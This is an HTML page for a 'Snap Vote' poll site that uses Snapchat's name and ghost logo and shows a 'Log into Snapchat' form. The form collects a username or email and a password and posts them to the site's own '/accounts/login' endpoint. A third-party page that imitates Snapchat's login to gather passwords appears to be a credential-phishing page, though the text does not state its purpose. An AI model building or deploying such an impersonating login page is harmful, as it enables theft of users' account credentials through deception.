<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="keywords" content="Snapchat, Snap, Kit, Vote, Poll, Ballot, Opinion, Debate, Discourse, Voice">

    <title>Voice your Opinions!</title>
	<link rel="icon" href="img/favicon/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href="style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <!--insert Google Analytics-->
</head>
<body>
    <div id="app">
        <div class="header">
            <a class="logo" href="/">
                <img src="/accounts/static/images/ghost/ghost.svg" alt="Snapchat">
                <h1>Snap Vote</h1>
            </a>
        </div>
        <div class="Login">
            <article class="page">
                <div class="container">
                    <h2 class="accountsTitle">Log into Snapchat</h2>
                    <div>
                        <form id="login_form" class="centered_form" action="/accounts/login" method="post">
                            <label class="control-label" for="username">Username or email</label>
                            <input id="username" class="form-control" type="text" name="username" value="" autocomplete="off">
                            <label class="control-label" for="password">Password</label>
                            <input id="password" class="form-control" type="password" name="password" value="" autocomplete="off">
                        </form>
                        <div class="primary_action">
                            <button class="btnlogin" type="submit">Log In</button>
                        </div>
                    </div>
                </div>
            </article>
        </div>
    </div>
</body>

</html>
